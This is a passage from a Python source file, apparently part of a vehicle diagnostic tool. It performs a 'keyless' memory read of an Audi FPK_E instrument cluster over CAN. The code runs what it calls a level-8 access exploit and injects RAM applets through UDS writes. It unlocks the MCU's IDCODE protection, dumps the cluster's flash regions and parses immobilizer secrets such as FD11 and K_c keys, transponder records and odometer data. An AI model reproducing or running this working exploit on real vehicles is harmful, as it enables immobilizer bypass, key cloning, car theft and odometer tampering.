                            raise RuntimeError(f"Trigger 0x3D rejected: {uds_reply.hex()}")
                    elif pci_type == 1:
                        # 10-byte positive response `7D 44 <addr:4> <len:4>` arrives as FirstFrame + ConsecutiveFrame
                        link.send_frame(link.UDS_TX_ID, b"\x30\x00\x00", pad=0x55)
                        if raw[2:3] == b"\x7f":
                            raise RuntimeError(f"Trigger 0x3D rejected: {raw.hex()}")
                        deadline = min(deadline, time.monotonic() + 0.25)
                    elif pci_type == 2:
                        got_7d = True
                        if len(collected) >= size:
                            break
                        deadline = min(deadline, time.monotonic() + 0.08)
        link.write_stream_summary(address, size, len(collected), rx_count)
    if len(collected) != size:
        if stream_state is not None:
            stream_state.clear()
        raise TimeoutError(
            f"RSCAN0 stream from 0x{link.STREAM_RX_ID:03X} @ 0x{address:08X} incomplete: {len(collected)}/{size} B"
        )
    if stream_state is not None:
        stream_state["next_addr"] = (addr_u32 + size) & 0xFFFFFFFF
        stream_state["frames"] = frames_needed
    return bytes(collected)


def fpke_read_region_in_session(
    link: FpkeCanLink,
    *,
    mode: str,
    source: int,
    length: int,
    chunk_size: int = 500,
    use_stream: bool = True,
    label: str = "",
    reporter: OperationReporter = NULL_REPORTER,
) -> tuple[bytes, dict[str, Any]]:
    """Read `[source, source + length)` in an already-authenticated FPK_E session (`direct`, `bflash`, or `uflash`).

    When `use_stream=True` and `length >= 512`, attempts fast RSCAN0 `TM17` (`0x6F1`) streaming first and
    automatically falls back to the hardware-verified UDS `0x23` / `result_addr` buffer method if the adapter drops frames.
    """
    if mode not in ("direct", "bflash", "uflash"):
        raise ValueError(f"Unsupported read mode: {mode}")
    if not (1 <= length <= FPKE_CFLASH_SIZE):
        raise ValueError(f"Read length must be 1..0x{FPKE_CFLASH_SIZE:X}, got {length}")

    reporter.reset_stage_timer()
    reporter.progress(0, length, unit="B", detail=label or mode)
    prof = _refine_link_profile_from_stack(link)
    prof_name = str(prof["name"])

    # 1. Try fast RSCAN0 TM17 streaming for bulk reads (>= 512 B, 8-byte aligned) when requested
    if use_stream and length >= 512 and source % 4 == 0 and length % 8 == 0:
        stream_payload = build_fpke_can_stream_applet(mode, profile=prof_name)
        stream_data = bytearray()
        try:
            with _applet_ram_guard(
                link,
                stream_payload,
                param_size=8,
                save_result=False,
                check_bfaselr=(mode == "bflash"),
            ) as guard_state:
                prof = _resolve_link_profile(link)
                mark_addr = int(prof["marker_addr"])
                offset = 0
                stream_state: dict[str, int] = {}
                was_ka = link.is_keepalive_running()
                with link.paused_keepalive():
                    last_ka = time.monotonic()
                    while offset < length:
                        reporter.check_cancelled()
                        now_t = time.monotonic()
                        if was_ka and now_t - last_ka >= 0.18:
                            with contextlib.suppress(Exception):
                                link.send_frame(0x3C0, b"\x00\x00\x03\x00", extended=False)
                                link.send_frame(0x663, b"\x00\x00\x00\x0e\x00\x00\x00\x00", extended=False)
                            last_ka = now_t
                        step = min(FPKE_STREAM_CHUNK_BYTES, length - offset)
                        part = _stream_chunk_via_rscan(
                            link,
                            source + offset,
                            step,
                            stream_state=stream_state,
                            pause_keepalive=False,
                        )
                        stream_data.extend(part)
                        offset += len(part)
                        reporter.progress(offset, length, unit="B", detail=f"{label or mode} @ 0x{source + offset:08X}")
                marker = fpke_read_memory_0x23(link, mark_addr, 4)
                if marker != b"SCAN":
                    raise RuntimeError(f"Stream applet marker mismatch: {marker.hex()}")
            if not guard_state.get("ram_restored"):
                raise RuntimeError("Failed to verify restored applet RAM after streaming")
            out_bytes = bytes(stream_data)
            return out_bytes, {
                "mode": mode,
                "protocol": "rscan_stream_0x6F1",
                "source": f"0x{source:08X}",
                "size": len(out_bytes),
                "chunk_size": FPKE_STREAM_CHUNK_BYTES,
                "requests": (length + FPKE_STREAM_CHUNK_BYTES - 1) // FPKE_STREAM_CHUNK_BYTES,
                "sha256": hashlib.sha256(out_bytes).hexdigest(),
                "payload_sha256": hashlib.sha256(stream_payload).hexdigest(),
                "ram_restored": True,
                "flash_writes": False,
            }
        except (TimeoutError, RuntimeError, UdsNegativeResponse, can.CanError) as exc:
            reporter.warning(
                tr(
                    f"Быстрый поток 0x6F1 прерван ({exc}) — автоматический переход на штатное чтение UDS 0x23…",
                    f"Fast 0x6F1 stream interrupted ({exc}) — falling back to verified UDS 0x23 read…",
                )
            )
            link.drain_rx(quick=True)
            link.start_keepalive()
            if fpke_check_level8(link) is None:
                link.level8_active = False
                fpke_ensure_level8(link, wake_seconds=1.5, reporter=reporter)
            reporter.reset_stage_timer()

    # 2. Verified UDS 0x23 (`direct`) or 256-byte `result_addr` RAM-buffer applet (`bflash` / `uflash`)
    data = bytearray()
    if mode == "direct":
        eff_chunk = max(1, min(chunk_size, 500))
        chunks = partition_chunks(length, eff_chunk)
        for idx, sz in enumerate(chunks):
            reporter.check_cancelled()
            addr = source + idx * eff_chunk
            data.extend(fpke_read_memory_0x23(link, addr, sz))
            reporter.progress(len(data), length, unit="B", detail=f"{label or 'UDS 0x23'} @ 0x{addr:08X}")
            if idx % 16 == 0 or idx + 1 == len(chunks):
                reporter.can_log(
                    tr(
                        f"{label or 'UDS 0x23'}: прочитано {len(data):,} / {length:,} байт",
                        f"{label or 'UDS 0x23'}: read {len(data):,} / {length:,} bytes",
                    )
                )
        out = bytes(data)
        return out, {
            "mode": "direct",
            "protocol": "uds_0x23",
            "source": f"0x{source:08X}",
            "size": len(out),
            "chunk_size": eff_chunk,
            "requests": len(chunks),
            "sha256": hashlib.sha256(out).hexdigest(),
            "ram_restored": None,
            "flash_writes": False,
        }

    # Applet buffer mode (`bflash` or `uflash`) — 256 bytes per call via `result_addr`
    prof = _refine_link_profile_from_stack(link)
    prof_name = str(prof["name"])
    buf_payload = build_fpke_uflash_buf_applet(prof_name) if mode == "uflash" else build_fpke_bflash_buf_applet(prof_name)
    buf_sha = hashlib.sha256(buf_payload).hexdigest()
    with _applet_ram_guard(
        link,
        buf_payload,
        param_size=4,
        save_result=True,
        check_bfaselr=(mode == "bflash"),
    ) as guard_state:
        prof = _resolve_link_profile(link)
        app_entry = int(prof["applet_entry"])
        src_param = int(prof["source_param"])
        res_addr = int(prof["result_addr"])
        saved_ret_addr = int(prof["saved_return"])
        for offset in range(0, length, 256):
            reporter.check_cancelled()
            sz = min(256, length - offset)
            addr = source + offset
            fpke_write_memory_0x3d(link, src_param, addr.to_bytes(4, "little"))
            fpke_write_memory_0x3d(link, saved_ret_addr, app_entry.to_bytes(4, "little"))
            raw = fpke_read_memory_0x23(link, res_addr, FPKE_RESULT_SIZE)
            if raw[256:260] != b"SCAN":
                raise RuntimeError(f"Applet SCAN marker mismatch at 0x{addr:08X}: {raw[256:260].hex()}")
            data.extend(raw[:sz])
            reporter.progress(len(data), length, unit="B", detail=f"{label or mode} @ 0x{addr:08X}")
    if not guard_state.get("ram_restored"):
        raise RuntimeError("Failed to restore applet RAM or BFASELR")
    out = bytes(data)
    return out, {
        "mode": mode,
        "protocol": "applet_256b_0x23",
        "source": f"0x{source:08X}",
        "size": len(out),
        "chunk_size": 256,
        "requests": (length + 255) // 256,
        "sha256": hashlib.sha256(out).hexdigest(),
        "payload_sha256": buf_sha,
        "ram_restored": True,
        "flash_writes": False,
    }


# ────────────────────────────── High-Level Workflows ──────────────────────────────


def _read_verified_extra_area(
    link: FpkeCanLink,
    *,
    length: int = FPKE_EXTRA_SIZE,
    label: str = "Extra Area",
    attempts: int = 6,
    retry_delay: float = 0.30,
    reporter: OperationReporter = NULL_REPORTER,
) -> tuple[bytes, dict[str, Any]]:
    """Read RH850 Extra Area (`0xFF300000`) with automatic retry across transient `R_EEL_Handler` DataFlash P/E windows.

    While KL15 keepalive is active, the cluster's background `R_EEL_Handler` / `R_FDL_Handler` task periodically enters
    RV40F DataFlash Program/Erase mode (`FENTRYD = 1`) for ~50–300 ms. During that window `0xFF300000` temporarily
    aliases DataFlash (`0xFF200000` VB 0) instead of Extra Area, failing `validate_fpke_extra_area()`. Passive retry
    lets `R_EEL_Handler` finish cleanly without touching FACI registers.
    """
    last_exc: RuntimeError | None = None
    for attempt in range(1, max(1, attempts) + 1):
        reporter.check_cancelled()
        raw, meta = fpke_read_region_in_session(
            link,
            mode="bflash",
            source=FPKE_EXTRA_ADDR,
            length=length,
            use_stream=False,
            label=label,
            reporter=reporter,
        )
        try:
            if len(raw) >= 0x80:
                validate_fpke_extra_area(raw)
            if attempt > 1:
                meta["eel_contention_retries"] = attempt - 1
            return raw, meta
        except RuntimeError as exc:
            last_exc = exc
            if attempt >= attempts:
                break
            reporter.can_log(
                tr(
                    f"Фоновое обращение панели приборов к DataFlash (EEL) во время чтения Extra Area — повтор ({attempt}/{attempts - 1})…",
                    f"Cluster background DataFlash (EEL) activity during Extra Area read — retrying ({attempt}/{attempts - 1})…",
                )
            )
            end_wait = time.monotonic() + retry_delay
            while time.monotonic() < end_wait:
                reporter.check_cancelled()
                time.sleep(min(0.05, max(0.01, end_wait - time.monotonic())))
    assert last_exc is not None
    raise RuntimeError(
        tr(
            f"Не удалось считать корректную область Extra Area (0xFF300000) после {attempts} попыток ({last_exc}). Повторите чтение.",
            f"Failed to read valid Extra Area (0xFF300000) after {attempts} attempts ({last_exc}). Please retry.",
        )
    ) from last_exc


def _read_verified_dflash(
    link: FpkeCanLink,
    *,
    chunk_size: int = 500,
    use_stream: bool = False,
    label: str = "DataFlash",
    attempts: int = 3,
    retry_delay: float = 0.35,
    reporter: OperationReporter = NULL_REPORTER,
) -> tuple[bytes, dict[str, Any]]:
    """Read 64 KiB FPK_E DataFlash (`0xFF200000`), retrying if background `R_EEL_Handler` was mid-erase during the read."""
    raw = b""
    meta: dict[str, Any] = {}
    for attempt in range(1, max(1, attempts) + 1):
        reporter.check_cancelled()
        raw, meta = fpke_read_region_in_session(
            link,
            mode="direct",
            source=FPKE_DFLASH_ADDR,
            length=FPKE_DFLASH_SIZE,
            chunk_size=chunk_size,
            use_stream=use_stream,
            label=label,
            reporter=reporter,
        )
        if is_fpke_dflash(raw) or attempt >= attempts:
            if attempt > 1:
                meta["eel_contention_retries"] = attempt - 1
            return raw, meta
        reporter.can_log(
            tr(
                f"Фоновое обновление пула EEL во время чтения DataFlash — повторное чтение ({attempt}/{attempts - 1})…",
                f"Cluster background EEL pool update during DataFlash read — re-reading ({attempt}/{attempts - 1})…",
            )
        )
        end_wait = time.monotonic() + retry_delay
        while time.monotonic() < end_wait:
            reporter.check_cancelled()
            time.sleep(min(0.05, max(0.01, end_wait - time.monotonic())))
    return raw, meta


def can_fpke_full_read(
    port: str,
    *,
    interface: str = "slcan",
    session_dir: Path | None = None,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    dflash_chunk: int = 500,
    use_stream: bool = False,
    read_uflash: bool = False,
    read_bflash: bool = False,
    read_cflash: bool = False,
    cflash_bytes: bytes | None = None,
    ident: list[dict[str, str]] | None = None,
    keep_open: bool = False,
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    bus: Any | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Complete single-session keyless read of Audi FPK_E SW 83A:

    1. Checks if vendor level 8 is already active on the open link; if not, establishes vendor level 8
       (automatically engaging the J533 transparent CAN RAM-bridge when `via_gateway=True` & `gateway_bridge=True`).
    2. Reads 256-byte Extra Area (`0xFF300000`) via `bflash` applet and validates security/OPBT0 words.
    3. Extracts candidate 16-byte `IDCODE` (`0xFF300050`), verifies it via hardware `IDAUTH` (`IDST 01 -> 00`),
       re-reads Extra Area with `IDAUTH` unlocked, and relocks `IDAUTH` with zeroes (`00 -> 01`).
    4. Reads full 64 KiB DataFlash (`0xFF200000..0xFF20FFFF`) and parses all EEL T01 secret structures
       (`FD11`, `K_c`, `IKA/CP`, `S0/S1`, transponders, coding, odometer).
    5. Optionally reads `UFlash` (32 KiB), `BFlash` (96 KiB), and/or `CFlash` (2 MiB) in the same session.
    6. Atomically writes `Dflash.bin`, `ExtraArea.bin`, `fpke_report.json`, and `fpke.can.log`.
       When `keep_open=True` (direct CAN), leaves the CAN connection and KL15 keepalive running for subsequent reads/procedures.
    """
    from contitool.can.workflows import default_session_dir

    verify_fpke_self_tests()
    out_dir = session_dir or default_session_dir(None, "fpke_read")
    out_dir.mkdir(parents=True, exist_ok=True)

    dflash_path = out_dir / "Dflash.bin"
    extra_path = out_dir / "ExtraArea.bin"
    report_path = out_dir / "fpke_report.json"
    can_log_path = out_dir / "fpke.can.log"

    total_steps = 4 + int(read_uflash) + int(read_bflash) + int(read_cflash)
    step_no = 1
    started = time.monotonic()

    with _managed_fpke_session(
        port,
        interface=interface,
        log_path=out_dir / "can.jsonl",
        bus=bus,
        keep_open=keep_open and not via_gateway,
        via_gateway=via_gateway,
        gateway_bridge=gateway_bridge,
        gateway_channel=gateway_channel,
        needs_level8=True,
        reporter=reporter,
    ) as (link, bridged):
        eff_stream = use_stream and (not via_gateway or bridged)
        eff_wake = min(wake_seconds, 1.5) if bridged else wake_seconds
        try:
            if ident and getattr(link, "sw_profile", None) is None:
                link.sw_profile = fpke_detect_sw_profile(ident)
            reporter.step(
                step_no,
                total_steps,
                tr("Проверка доступа уровня 8 по CAN", "Checking level 8 CAN access"),
            )
            exploit_info = fpke_ensure_level8(
                link,
                frame_delay=frame_delay,
                wake_seconds=eff_wake,
                reporter=reporter,
            )

            step_no += 1
            reporter.step(
                step_no,
                total_steps,
                tr("Чтение конфигурации процессора и проверка IDCODE", "Reading MCU configuration & verifying IDCODE"),
            )
            initial_extra, initial_extra_meta = _read_verified_extra_area(
                link,
                label="Extra Area (initial)",
                reporter=reporter,
            )
            candidate_idcode = bytes(initial_extra[0x50:0x60])

            idst_before = fpke_read_memory_0x23(link, IDST_ADDR, 4)
            idst_after = fpke_idauth(link, candidate_idcode)
            if idst_after != b"\x00\x00\x00\x00":
                with contextlib.suppress(Exception):
                    fpke_idauth(link, b"\x00" * 16)
                raise RuntimeError(f"Hardware IDAUTH rejected candidate IDCODE: IDST={idst_after.hex()}")
            try:
                extra_bytes, extra_read_meta = _read_verified_extra_area(
                    link,
                    label="Extra Area",
                    reporter=reporter,
                )
            except RuntimeError:
                # `initial_extra` already passed structural validation and hardware IDAUTH accepted its IDCODE
                extra_bytes, extra_read_meta = initial_extra, dict(initial_extra_meta, fallback_to_initial=True)
            finally:
                idst_relock = fpke_idauth(link, b"\x00" * 16)
            validate_fpke_extra_area(extra_bytes)
            atomic_write(extra_path, extra_bytes)
            extra_info = analyze_fpke_extra_area(extra_bytes)
            idauth_info = {
                "candidate_idcode": candidate_idcode.hex(),
                "accepted": True,
                "idst_before": idst_before.hex(),
                "idst_after_idcode": idst_after.hex(),
                "idst_after_relock": idst_relock.hex(),
            }
            reporter.can_log(
                tr(
                    f"Extra Area считана и проверена: IDCODE={extra_info['idcode_spaced']} (IDAUTH принят: {idst_before.hex()} -> {idst_after.hex()} -> {idst_relock.hex()})",
                    f"Extra Area read & verified: IDCODE={extra_info['idcode_spaced']} (IDAUTH accepted: {idst_before.hex()} -> {idst_after.hex()} -> {idst_relock.hex()})",
                )
            )
            reporter.info(tr("Конфигурация процессора считана, IDCODE подтверждён", "MCU configuration read, IDCODE verified"))

            step_no += 1
            reporter.step(
                step_no,
                total_steps,
                tr("Чтение DataFlash (64 КБ)", "Reading DataFlash (64 KB)"),
            )
            dflash_bytes, dflash_read_meta = _read_verified_dflash(
                link,
                chunk_size=dflash_chunk,
                use_stream=eff_stream,
                label="DataFlash",
                reporter=reporter,
            )
            atomic_write(dflash_path, dflash_bytes)

            opt_results: dict[str, Any] = {}
            if read_uflash:
                step_no += 1
                reporter.step(step_no, total_steps, tr("Чтение Uflash (32 КБ)", "Reading Uflash (32 KB)"))
                uf_bytes, uf_meta = fpke_read_region_in_session(
                    link,
                    mode="uflash",
                    source=FPKE_UFLASH_ADDR,
                    length=FPKE_UFLASH_SIZE,
                    use_stream=eff_stream,
                    label="Uflash",
                    reporter=reporter,
                )
                uf_path = out_dir / "Uflash.bin"
                atomic_write(uf_path, uf_bytes)
                uf_meta["output"] = str(uf_path)
                opt_results["uflash"] = uf_meta

            if read_bflash:
                step_no += 1
                reporter.step(step_no, total_steps, tr("Чтение Bflash (96 КБ)", "Reading Bflash (96 KB)"))
                bf_bytes, bf_meta = fpke_read_region_in_session(
                    link,
                    mode="bflash",
                    source=FPKE_BFLASH_ADDR,
                    length=FPKE_BFLASH_SIZE,
                    use_stream=eff_stream,
                    label="Bflash",
                    reporter=reporter,
                )
                bf_path = out_dir / "Bflash.bin"
                atomic_write(bf_path, bf_bytes)
                bf_meta["output"] = str(bf_path)
                opt_results["bflash"] = bf_meta

            if read_cflash:
                step_no += 1
                reporter.step(step_no, total_steps, tr("Чтение CodeFlash (2 МБ)", "Reading CodeFlash (2 MB)"))
                cf_bytes_read, cf_meta = fpke_read_region_in_session(
                    link,
                    mode="direct",
                    source=FPKE_CFLASH_ADDR,
                    length=FPKE_CFLASH_SIZE,
                    chunk_size=500,
                    use_stream=eff_stream,
                    label="CodeFlash",
                    reporter=reporter,
                )
                cf_path = out_dir / "Cflash.bin"
                atomic_write(cf_path, cf_bytes_read)
                cf_meta["output"] = str(cf_path)
                opt_results["cflash"] = cf_meta
                cflash_bytes = cf_bytes_read

            step_no += 1
            reporter.step(
                step_no,
                total_steps,
                tr("Разбор данных DataFlash", "Analyzing DataFlash records"),
            )
            from contitool.core.fpke import extract_fpke_immo_passport

            secrets = analyze_fpke_dflash(dflash_bytes, cflash_bytes)
            immo_passport = extract_fpke_immo_passport(dflash_bytes, cflash_bytes)
            immo_passport_path = out_dir / "immo_passport.json"
            atomic_write(immo_passport_path, (json.dumps(immo_passport, ensure_ascii=False, indent=2) + "\n").encode("utf-8"))

            prof = _resolve_link_profile(link)
            report: dict[str, Any] = {
                "target": prof["target_label"],
                "sw_profile": prof["name"],
                "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                "port": port,
                "interface": interface,
                "via_gateway": bool(via_gateway),
                "gateway_bridged": bool(bridged),
                "frame_delay_s": frame_delay,
                "can_only": True,
                "target_keys_used": False,
                "flash_writes": False,
                "ident": list(ident) if ident else [],
                "exploit": exploit_info,
                "idauth": idauth_info,
                "extra_area": extra_info,
                "extra": {
                    **extra_read_meta,
                    **extra_info,
                    "idauth": idauth_info,
                    "output": str(extra_path),
                },
                "dflash": {
                    **dflash_read_meta,
                    "first_16": dflash_bytes[:16].hex(),
                    "last_16": dflash_bytes[-16:].hex(),
                    "output": str(dflash_path),
                },
                "secrets": secrets,
                **opt_results,
                "wall_s": round(time.monotonic() - started, 3),
                "session_dir": str(out_dir),
                "report_path": str(report_path),
                "immo_passport_path": str(immo_passport_path),
                "can_log": str(can_log_path),
            }
            atomic_write(report_path, (json.dumps(report, ensure_ascii=False, indent=2) + "\n").encode("utf-8"))
            reporter.success(
                tr(
                    f"Память блока считана за {report['wall_s']:.1f} с. Папка: {out_dir}",
                    f"ECU memory read in {report['wall_s']:.1f} s. Folder: {out_dir}",
                )
            )
            return report
        finally:
            link.save_can_log(can_log_path)


def can_fpke_read_region(
    port: str,
    *,
    mode: str = "dflash",
    interface: str = "slcan",
    source: int | None = None,
    length: int | None = None,
    chunk_size: int = 500,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    use_stream: bool = False,
    idcode_hex: str | None = None,
    fd11_key_hex: str | None = None,
    output_path: Path | None = None,
    session_dir: Path | None = None,
    keep_open: bool = False,
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    bus: Any | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Read one specific FPK_E memory region (`dflash`, `cflash`, `extra`, `uflash`, `bflash`, `direct`, or `known-key`).

    Note: `mode='dflash'` with `use_stream=False` follows the strict `audi-83a-keyless-can-access.md` specification:
    only vendor level 8 + UDS `0x23`, with NO `0x3D` writes and NO RAM applets.
    When `keep_open=True` (or when an active session link is already open), checks if vendor level 8 is already unlocked
    and only runs the level-8 exploit if needed.
    """
    from contitool.can.workflows import default_session_dir

    verify_fpke_self_tests()
    presets: dict[str, tuple[str, int, int, str]] = {
        "dflash": ("direct", FPKE_DFLASH_ADDR, FPKE_DFLASH_SIZE, "Dflash.bin"),
        "cflash": ("direct", FPKE_CFLASH_ADDR, FPKE_CFLASH_SIZE, "Cflash.bin"),
        "extra": ("bflash", FPKE_EXTRA_ADDR, FPKE_EXTRA_SIZE, "ExtraArea.bin"),
        "uflash": ("uflash", FPKE_UFLASH_ADDR, FPKE_UFLASH_SIZE, "Uflash.bin"),
        "bflash": ("bflash", FPKE_BFLASH_ADDR, FPKE_BFLASH_SIZE, "Bflash.bin"),
        "direct": ("direct", FPKE_DFLASH_ADDR if source is None else source, FPKE_DFLASH_SIZE if length is None else length, "Memory.bin"),
        "known-key": ("direct", FPKE_DFLASH_ADDR if source is None else source, FPKE_DFLASH_SIZE if length is None else length, "Dflash.bin"),
    }
    if mode not in presets:
        raise ValueError(f"Unsupported FPK_E read mode: {mode}")
    hw_mode, def_src, def_len, def_name = presets[mode]
    eff_source = def_src if source is None else source
    eff_length = def_len if length is None else length

    out_dir = session_dir or (output_path.parent if output_path is not None else default_session_dir(None, f"fpke_{mode}"))
    out_dir.mkdir(parents=True, exist_ok=True)
    bin_path = output_path or (out_dir / def_name)
    report_path = bin_path.with_suffix(".json")
    can_log_path = bin_path.with_suffix(".can.log")

    idcode_bytes = bytes.fromhex(idcode_hex) if idcode_hex else None
    if idcode_bytes is not None and len(idcode_bytes) != 16:
        raise ValueError("--idcode must contain exactly 16 bytes (32 hex chars)")

    started = time.monotonic()
    with _managed_fpke_session(
        port,
        interface=interface,
        log_path=out_dir / "can.jsonl",
        bus=bus,
        keep_open=keep_open and not via_gateway,
        via_gateway=via_gateway,
        gateway_bridge=gateway_bridge,
        gateway_channel=gateway_channel,
        needs_level8=(mode != "known-key"),
        reporter=reporter,
    ) as (link, bridged):
        eff_stream = use_stream and mode != "known-key" and (not via_gateway or bridged)
        eff_wake = min(wake_seconds, 1.5) if bridged else wake_seconds
        try:
            if mode == "known-key":
                if not fd11_key_hex:
                    raise ValueError("--fd11-key (16-byte hex) is required for known-key mode")
                key_bytes = bytes.fromhex(fd11_key_hex)
                link.start_keepalive()
                if eff_wake > 0 and not via_gateway:
                    time.sleep(eff_wake)
                reporter.step(1, 2, tr("Штатная авторизация FD11", "Standard FD11 authentication"))
                fd11_id = fpke_authenticate_fd11(link, key_bytes, reporter=reporter)
                access_info: dict[str, Any] = {"exploit": False, "vendor_level": 6, "fd11_identifier": fd11_id}
            else:
                reporter.step(1, 2, tr("Проверка доступа уровня 8 по CAN", "Checking level 8 CAN access"))
                access_info = fpke_ensure_level8(
                    link,
                    frame_delay=frame_delay,
                    wake_seconds=eff_wake,
                    reporter=reporter,
                )

            idauth_meta: dict[str, Any] | None = None
            if idcode_bytes is not None:
                idst_before = fpke_read_memory_0x23(link, IDST_ADDR, 4)
                idst_after = fpke_idauth(link, idcode_bytes)
                if idst_after != b"\x00\x00\x00\x00":
                    raise RuntimeError(f"IDCODE rejected by hardware IDAUTH: IDST={idst_after.hex()}")
                idauth_meta = {"idst_before": idst_before.hex(), "idst_after_idcode": idst_after.hex()}

            reporter.step(2, 2, tr(f"Чтение памяти 0x{eff_source:08X} ({eff_length:,} Б)", f"Reading memory 0x{eff_source:08X} ({eff_length:,} B)"))
            try:
                if eff_source == FPKE_EXTRA_ADDR and eff_length >= 0x80 and hw_mode == "bflash":
                    data, read_meta = _read_verified_extra_area(
                        link,
                        length=eff_length,
                        label=mode.upper(),
                        reporter=reporter,
                    )
                elif eff_source == FPKE_DFLASH_ADDR and eff_length == FPKE_DFLASH_SIZE and hw_mode == "direct":
                    data, read_meta = _read_verified_dflash(
                        link,
                        chunk_size=chunk_size,
                        use_stream=eff_stream,
                        label=mode.upper(),
                        reporter=reporter,
                    )
                else:
                    data, read_meta = fpke_read_region_in_session(
                        link,
                        mode=hw_mode,
                        source=eff_source,
                        length=eff_length,
                        chunk_size=chunk_size,
                        use_stream=eff_stream,
                        label=mode.upper(),
                        reporter=reporter,
                    )
            finally:
                if idcode_bytes is not None and idauth_meta is not None:
                    idst_relock = fpke_idauth(link, b"\x00" * 16)
                    idauth_meta["idst_after_relock"] = idst_relock.hex()

            if eff_source == FPKE_EXTRA_ADDR and len(data) >= 0x80:
                validate_fpke_extra_area(data)

            atomic_write(bin_path, data)
            prof = _resolve_link_profile(link)
            report: dict[str, Any] = {
                "target": prof["target_label"],
                "sw_profile": prof["name"],
                "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                "port": port,
                "interface": interface,
                "via_gateway": bool(via_gateway),
                "gateway_bridged": bool(bridged),
                "mode": mode,
                "can_only": True,
                "target_keys_used": mode == "known-key",
                "flash_writes": False,
                "access": access_info,
                "read": read_meta,
                "idauth": idauth_meta,
                "wall_s": round(time.monotonic() - started, 3),
                "output": str(bin_path),
                "report_path": str(report_path),
                "can_log": str(can_log_path),
                "session_dir": str(out_dir),
            }
            if eff_source == FPKE_EXTRA_ADDR and len(data) == FPKE_EXTRA_SIZE:
                report["extra_analysis"] = analyze_fpke_extra_area(data)
            elif eff_source == FPKE_DFLASH_ADDR and len(data) == FPKE_DFLASH_SIZE:
                report["secrets"] = analyze_fpke_dflash(data)

            atomic_write(report_path, (json.dumps(report, ensure_ascii=False, indent=2) + "\n").encode("utf-8"))
            return report
        finally:
            link.save_can_log(can_log_path)


# ────────────────────────────── Cluster Diagnostic & Service Procedures ──────────────────────────────


def fpke_run_procedure(
    link: FpkeCanLink,
    proc_id: str,
    *,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Execute a diagnostic or bench procedure on `link` (keeping the CAN link open)."""
    link.start_keepalive()

    if proc_id == "ensure_level8":
        info = fpke_ensure_level8(link, frame_delay=frame_delay, wake_seconds=wake_seconds, reporter=reporter)
        reused = bool(info.get("reused_session"))
        msg = (
            tr("Доступ уровня 8 уже открыт.", "Access level 8 is already unlocked.")
            if reused
            else tr("Доступ уровня 8 успешно открыт.", "Access level 8 unlocked.")
        )
        reporter.success(msg)
        return {"procedure": proc_id, "ok": True, "summary": msg, "details": info}

    if proc_id == "immo_status":
        from contitool.core.fpke import decode_fpke_02ed, decode_fpke_02ee

        link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
        st_02ed = link.request_uds(b"\x22\x02\xed", 0x62, timeout=2.0)[3:]
        st_02ef = link.request_uds(b"\x22\x02\xef", 0x62, timeout=2.0)[3:]
        st_03de = link.request_uds(b"\x22\x03\xde", 0x62, timeout=2.0)[3:]
        st_02e0 = link.request_uds(b"\x22\x02\xe0", 0x62, timeout=2.0)[3:]
        st_02ee: bytes | None = None
        with contextlib.suppress(Exception):
            st_02ee = link.request_uds(b"\x22\x02\xee", 0x62, timeout=1.5)[3:]

        d_02ed = decode_fpke_02ed(st_02ed)
        d_02ee = decode_fpke_02ee(st_02ee) if st_02ee else None
        mode_fam = d_02ed["life_state"]
        learned = d_02ed["learned_keys"]
        rem_keys = d_02ed["remaining_keys"]
        p_class_hex = d_02ed["power_class_hex"]
        cp_cnt = int.from_bytes(st_03de[:2], "big") if len(st_03de) >= 2 else 0
        lock_mins = list(st_02ef[:6])
        max_lock = max(lock_mins) if lock_mins else 0
        mode_txt = {
            1: tr("заводской режим", "virgin mode"),
            2: tr("рабочий режим", "normal mode"),
            3: tr("обучение ключей", "key learning mode"),
        }.get(mode_fam, tr(f"режим {mode_fam}", f"mode {mode_fam}"))
        lock_txt = (
            tr(f"таймер блокировки: {max_lock} мин", f"lockout timer: {max_lock} min")
            if max_lock > 0
            else tr("блокировок нет", "no lockouts")
        )
        pc_txt = f" • PowerClass: {p_class_hex}" if p_class_hex else ""
        msg = tr(
            f"Иммобилайзер: {mode_txt}{pc_txt} • Ключей: {learned} (свободно: {rem_keys}) • {lock_txt}",
            f"Immobilizer: {mode_txt}{pc_txt} • Keys: {learned} (free: {rem_keys}) • {lock_txt}",
        )
        if cp_cnt:
            msg += tr(f" • Счётчик CP: {cp_cnt}", f" • CP counter: {cp_cnt}")
        reporter.info(msg)
        return {
            "procedure": proc_id,
            "ok": True,
            "summary": msg,
            "mode_family": mode_fam,
            "power_class": d_02ed["power_class"],
            "power_class_hex": p_class_hex,
            "identity_counter": d_02ed["identity_counter"],
            "brand_id": d_02ed["brand_id"],
            "keyless_coded": d_02ed["keyless_coded"],
            "learned_keys": learned,
            "remaining_keys": rem_keys,
            "cp_counter": cp_cnt,
            "lockout_minutes": lock_mins,
            "challenge_r": st_02e0.hex().upper(),
            "slaves_02ee": d_02ee,
        }

    if proc_id == "read_dtc":
        from contitool.core import dtc as dtc_mod

        resp = link.request_uds(b"\x19\x02\xff", 0x59, timeout=3.0)
        active_dtcs: list[dict[str, Any]] = []
        stored_dtcs: list[dict[str, Any]] = []
        untested_count = 0
        # 59 02 <status_availability_mask> [DTC_hi DTC_mid DTC_lo status] * N
        for off in range(3, len(resp) - 3, 4):
            code = int.from_bytes(resp[off : off + 3], "big")
            status = resp[off + 3]
            grp = dtc_mod.group(status)
            if grp == "untested":
                untested_count += 1
                continue
            disp, desc = dtc_mod.describe_fpke(code)
            entry = {
                "code": f"0x{code:06X}",
                "code_int": code,
                "display": disp,
                "description": desc,
                "status": f"0x{status:02X}",
                "status_text": dtc_mod.status_text(status),
                "group": grp,
                "active": grp == "active",
            }
            if grp == "active":
                active_dtcs.append(entry)
            else:
                stored_dtcs.append(entry)

        dtcs = active_dtcs + stored_dtcs
        if dtcs:
